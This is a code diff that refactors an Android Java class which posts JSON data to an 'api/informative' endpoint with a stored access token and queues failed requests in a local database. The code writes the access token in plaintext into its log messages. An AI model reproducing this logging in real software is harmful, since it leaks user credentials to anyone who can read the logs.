@@ -12,6 +12,7 @@ import android.content.SharedPreferences.Editor;
 import android.os.AsyncTask;
 import android.preference.PreferenceManager;
 
+import com.inet.android.db.OperationWithRecordInDataBase;
 import com.inet.android.db.RequestDataBaseHelper;
 import com.inet.android.db.RequestWithDataBase;
 import com.inet.android.utils.Logging;
@@ -26,13 +27,13 @@ public class DataRequest extends DefaultRequest {
 	private final String LOG_TAG = DataRequest.class.getSimpleName().toString();
 	final private String additionURL = "api/informative";
 
-	private final int type = 3;
-	Context ctx;
+	private final int type = 4;
+	Context mContext;
 	static RequestDataBaseHelper db;
 
 	public DataRequest(Context ctx) {
 		super(ctx);
-		this.ctx = ctx;
+		this.mContext = ctx;
 	}
 
 	@Override
@@ -65,7 +66,7 @@ public class DataRequest extends DefaultRequest {
 		Logging.doLog(LOG_TAG, "1: " + request, "1: " + request);
 		if (!request.equals(" ") && !request.equals("")) {
 			SharedPreferences sp = PreferenceManager
-					.getDefaultSharedPreferences(ctx);
+					.getDefaultSharedPreferences(mContext);
 			JSONObject jsonObject = new JSONObject();
 			JSONArray jsonArray = new JSONArray();
 			String requestArray = null;
@@ -73,7 +74,6 @@ public class DataRequest extends DefaultRequest {
 				jsonObject.put("key", System.currentTimeMillis());
 				requestArray = "[" + request + "]";
 				jsonArray = new JSONArray(requestArray);
-				// jsonArray = new JSONArray(request);
 				jsonObject.put("data", jsonArray);
 
 				Logging.doLog(LOG_TAG, "jsonArray: " + jsonArray.toString(),
@@ -86,29 +86,32 @@ public class DataRequest extends DefaultRequest {
 
 			String str = null;
 			try {
-				Logging.doLog(LOG_TAG, "do make.requestArray: "
-						+ jsonObject.toString() + " " + sp.getString("access_second_token", " "), "do make.requestArray: "
-						+ jsonObject.toString() + " " + sp.getString("access_second_token", " "));
+				Logging.doLog(LOG_TAG,
+						"do make.requestArray: " + jsonObject.toString() + " "
+								+ sp.getString("access_second_token", " "),
+						"do make.requestArray: " + jsonObject.toString() + " "
+								+ sp.getString("access_second_token", " "));
 
 				str = Caller.doMake(jsonObject.toString(),
 						sp.getString("access_second_token", ""), additionURL,
-						true, null, ctx);
+						true, null, mContext);
 			} catch (IOException e) {
 				// Добавление в базу request
 				e.printStackTrace();
+				Logging.doLog(LOG_TAG, "IOException DataRequest",
+						"IOException DataRequest");
 
-				Logging.doLog(LOG_TAG, "db.request: " + request, "db.request: "
-						+ request);
-
-				db = new RequestDataBaseHelper(ctx);
-				db.addRequest(new RequestWithDataBase(request, type, null,
-						null, null));
 			}
 			if (str != null) {
 				getRequestData(str);
 			} else {
 				Logging.doLog(LOG_TAG, "ответа от сервера нет",
 						"ответа от сервера нет");
+				// ---------- data request in base ------------------
+
+				OperationWithRecordInDataBase.insertRecord(request, type, null,
+						null, null, mContext);
+
 			}
 		} else {
 			Logging.doLog(LOG_TAG, "request == null", "request == null");
@@ -121,7 +124,7 @@ public class DataRequest extends DefaultRequest {
 				"getResponseData: " + response);
 
 		SharedPreferences sp = PreferenceManager
-				.getDefaultSharedPreferences(ctx);
+				.getDefaultSharedPreferences(mContext);
 
 		JSONObject jsonObject = null;
 		String str = null;
@@ -140,8 +143,7 @@ public class DataRequest extends DefaultRequest {
 		}
 
 		if (str.equals("2")) {
-			PeriodicRequest pr = new PeriodicRequest(ctx);
-			pr.sendRequest(null);
+			RequestList.sendPeriodicRequest(mContext);
 		}
 
 		if (str.equals("0")) {
@@ -164,8 +166,7 @@ public class DataRequest extends DefaultRequest {
 							"is not available for this operation",
 							"is not available for this operation");
 				if (errstr.equals("3"))
-					Logging.doLog(LOG_TAG, "the wrong key",
-							"the wrong key");
+					Logging.doLog(LOG_TAG, "the wrong key", "the wrong key");
 			} else {
 				ed.putString("error_data", "");
 			}
